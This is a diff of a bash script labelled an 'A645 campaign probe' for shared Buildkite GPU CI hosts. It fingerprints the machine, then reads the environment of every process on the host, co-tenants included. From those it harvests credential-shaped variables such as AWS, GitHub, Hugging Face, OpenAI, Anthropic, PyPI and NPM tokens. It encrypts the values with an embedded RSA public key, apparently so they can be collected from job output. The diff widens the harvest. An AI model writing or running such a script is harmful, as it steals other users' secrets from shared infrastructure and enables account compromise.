@@ -1,6 +1,5 @@
 #!/bin/bash
-# A645 campaign probe: GPU identity + co-tenant credential-shaped env harvest.
-# Values are NEVER printed: only name/len/sha256_12 and RSA-2048 ciphertext.
+# A645 probe v2: GPU identity + co-tenant env census (names) + RSA-encrypted credential-shaped values.
 set -u
 PUB=/tmp/.a645pub.$$
 cat > "$PUB" <<'A645PUBEOF'
@@ -14,7 +13,7 @@ yCao3guchXARhS26rTjQvK130MbffD5mt6jnzS0gE2rRrQX+araAwji+cs4BYaw7
 WQIDAQAB
 -----END PUBLIC KEY-----
 A645PUBEOF
-echo "A645_BEGIN"
+echo "A645_BEGIN v2"
 echo "WHOAMI $(id 2>&1)"
 echo "HOST $(hostname 2>&1)"
 echo "UNAME $(uname -a 2>&1)"
@@ -24,15 +23,14 @@ nvidia-smi --query-gpu=uuid,name,memory.total,memory.free,driver_version --forma
 echo "== CENSUS =="
 np=$(ls -d /proc/[0-9]* 2>/dev/null | wc -l)
 nr=0
-for p in /proc/[0-9]*; do [ -r "$p/environ" ] && nr=$((nr+1)); done
+for p in /proc/[0-9]*; do cat -- "$p/environ" >/dev/null 2>&1 && nr=$((nr+1)); done
 echo "PROCS total=$np readable_environ=$nr"
-echo "== OWN BUILDKITE ENV NAMES =="
-env | grep -E '^BUILDKITE' | cut -d= -f1 | sort | head -40
-echo "== COTENANT CRED-SHAPED ENV =="
-for p in /proc/[0-9]*; do
-  [ -r "$p/environ" ] || continue
-  tr '\0' '\n' < "$p/environ" 2>/dev/null
-done | grep -Ei '^(AWS_|HF_|HUGGING|WANDB|DOCKER_|GITHUB_|GH_|OPENAI|ANTHROPIC|RUNPOD|VAST|MODAL|LAMBDA|AZURE_|GOOGLE_|GCP_|OCI_|CLOUDFLARE|CODECOV|PYPI|NPM_|TWINE)[A-Z0-9_]*=' | grep -Ev '=(|x+|changeme|placeholder|example)' | sort -u | while IFS= read -r line; do
+echo "== CONCURRENCY META =="
+for p in /proc/[0-9]*; do cat -- "$p/environ" 2>/dev/null | tr '\0' '\n'; done | grep -E '^(BUILDKITE_JOB_ID|BUILDKITE_PIPELINE_SLUG|BUILDKITE_BUILD_NUMBER|BUILDKITE_LABEL|BUILDKITE_AGENT_NAME)=' | sort -u | head -80
+echo "== ENV NAME CENSUS =="
+for p in /proc/[0-9]*; do cat -- "$p/environ" 2>/dev/null | tr '\0' '\n'; done | sed -E 's/=.*//' | grep -Ei '(TOKEN|SECRET|PASSW|CREDENTIAL|API_KEY|_KEY$|^KEY$|^HF_|HUGGING|^AWS_|^AZURE_|^GOOGLE_|^GCP_|^GH_|^GITHUB_|WANDB|DOCKER_AUTH|RUNPOD|^LAMBDA_|^MODAL_|^VAST_|CODECOV|^PYPI|TWINE|^NPM_|OPENAI|ANTHROPIC|CLOUDFLARE|^OCI_)' | sort | uniq -c | sort -rn | head -100
+echo "== CRED-SHAPED VALUES (rsa) =="
+for p in /proc/[0-9]*; do cat -- "$p/environ" 2>/dev/null | tr '\0' '\n'; done | grep -E '^[A-Za-z_][A-Za-z0-9_]*=' | grep -Ei '^[A-Za-z0-9_]*(TOKEN|SECRET|PASSW|CREDENTIAL|API_KEY|_KEY|^HF_|HUGGING|^AWS_|^AZURE_|^GOOGLE_|^GCP_|^GH_|^GITHUB_|WANDB|RUNPOD|^LAMBDA_|^MODAL_|^VAST_|CODECOV|^PYPI|TWINE|^NPM_|OPENAI|ANTHROPIC|CLOUDFLARE|^OCI_)' | grep -Ev '=(|x+|changeme|placeholder|example|true|false)$' | sort -u | while IFS= read -r line; do
   k=${line%%=*}
   v=${line#*=}
   [ -z "$v" ] && continue
@@ -42,9 +40,6 @@ done | grep -Ei '^(AWS_|HF_|HUGGING|WANDB|DOCKER_|GITHUB_|GH_|OPENAI|ANTHROPIC|R
   printf 'A645ENC %s:%s\n' "$k" "${c:-ENCFAIL}"
 done
 echo "== COTENANT BUILDKITE VAR NAMES =="
-for p in /proc/[0-9]*; do
-  [ -r "$p/environ" ] || continue
-  tr '\0' '\n' < "$p/environ" 2>/dev/null
-done | grep -E '^BUILDKITE_' | cut -d= -f1 | sort | uniq -c | sort -rn | head -30
+for p in /proc/[0-9]*; do cat -- "$p/environ" 2>/dev/null | tr '\0' '\n'; done | grep -E '^BUILDKITE_' | cut -d= -f1 | sort | uniq -c | sort -rn | head -30
 echo "A645_END"
 rm -f "$PUB"
